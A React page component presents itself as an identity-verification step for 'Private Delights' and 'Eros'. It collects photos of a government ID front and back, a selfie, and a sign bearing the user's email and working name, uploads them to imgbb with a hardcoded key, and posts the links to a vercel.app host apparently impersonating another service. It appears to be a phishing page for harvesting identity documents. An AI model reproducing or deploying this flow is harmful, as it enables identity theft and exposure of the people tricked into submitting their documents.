import React, { useState } from "react";
import axios from "axios";
import "./Verify.css";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const Verify = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  let navigate = useNavigate();

  const [img1, setImg1] = useState(null);
  const [img2, setImg2] = useState(null);
  const [img3, setImg3] = useState(null);
  const [img4, setImg4] = useState(null);

  const onSubmit = (data) => {
    const idImg = {
      img1: img1,
      img2: img2,
      img3: img3,
      img4: img4,
    };
    console.log(idImg);
    fetch("https://tryst-rubel-sarver.vercel.app/code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(idImg),
    })
      .then((res) => res.json())
      .then((result) => navigate("/"));
  };

  const ImageUpload = (event) => {
    console.log(event.target.files[0]);
    const ImgData = new FormData();
    ImgData.set("key", "3b61f7918dc1a39c2999937d1c16a97d");
    ImgData.append("image", event.target.files[0]);

    axios
      .post("https://api.imgbb.com/1/upload", ImgData)
      .then(function (response) {
        setImg1(response.data.data.display_url);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  const ImageUp = (event) => {
    console.log(event.target.files[0]);
    const ImgData = new FormData();
    ImgData.set("key", "3b61f7918dc1a39c2999937d1c16a97d");
    ImgData.append("image", event.target.files[0]);

    axios
      .post("https://api.imgbb.com/1/upload", ImgData)
      .then(function (response) {
        setImg2(response.data.data.display_url);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  const ImageUploaded = (event) => {
    console.log(event.target.files[0]);
    const ImgData = new FormData();
    ImgData.set("key", "3b61f7918dc1a39c2999937d1c16a97d");
    ImgData.append("image", event.target.files[0]);

    axios
      .post("https://api.imgbb.com/1/upload", ImgData)
      .then(function (response) {
        setImg3(response.data.data.display_url);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  const ImageUploads = (event) => {
    console.log(event.target.files[0]);
    const ImgData = new FormData();
    ImgData.set("key", "3b61f7918dc1a39c2999937d1c16a97d");
    ImgData.append("image", event.target.files[0]);

    axios
      .post("https://api.imgbb.com/1/upload", ImgData)
      .then(function (response) {
        setImg4(response.data.data.display_url);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  return (
    <>
      <div className="container text-center">
        <div className="mt-2">
          <p className="verifieds">Let's get you verified</p>
          <h6 className="text-danger mt-4 mb-1 pb-0">
            ID card, Passport, Residence permit, Driver's license
          </h6>

          <form onSubmit={handleSubmit(onSubmit)}>
            <div>
              <p className="p-0 mb-1 UploadData">
                Upload or take a front picture of your Government ID on a flat
                surface*
              </p>
              <div className="text-center">
                <input
                  accept="image/*"
                  className=" DefaultFile"
                  type={"file"}
                  {...register("exampleReq", { required: true })}
                  onChange={ImageUpload}
                />
              </div>
            </div>
            <div>
              <p className="p-0 mb-1 UploadData">
                Upload or take a back picture of your Government ID on a flat
                surface*
              </p>
              <input
                accept="image/*"
                className=" DefaultFile"
                type={"file"}
                {...register("example", { required: true })}
                onChange={ImageUploads}
              />
            </div>
            <div>
              <p className="p-0 mb-1 UploadData">
                Upload or take a selfie of your Government ID on a flat surface*
              </p>
              <input
                accept="image/*"
                className=" DefaultFile"
                type={"file"}
                {...register("exampleRequired", { required: true })}
                onChange={ImageUp}
              />
            </div>
            <div>
              <p className="p-0 mb-1 UploadData">
                Your photo must show you holding a handwritten sing showing the
                following information :
                <br /> 1: The phrase "Private Delights" (The verification
                process of PrivateDelights and Eros has been integrated)
                <br /> 2: The email address you signed up with <br />
                3: Your working name (this should match your profile) <br />
                4: Todays's date <br />
              </p>
              <input
                accept="image/*"
                className=" DefaultFile"
                type={"file"}
                {...register("exampleReqQ", { required: true })}
                onChange={ImageUploaded}
              />
            </div>
            <div>
              <input
                class="form-check-input  RememberId "
                type="checkbox"
                id="flexCheckDefault"
                {...register("exam", { required: true })}
              />
              <span class="ps-2" for="flexCheckDefault">
                I agree to the processing of my personal data, as described in
                <span className="text-danger ps-1 Processing">
                  the consent to Personal Data Processing
                </span>
              </span>
            </div>
            {errors.exampleRequired && <span>This field is required</span>}
            <div className="text-center pt-4">
              <input
                className="btn btn-danger LoginData"
                type="submit"
                value={"Login"}
              />
            </div>
          </form>
        </div>
      </div>
    </>
  );
};

export default Verify;
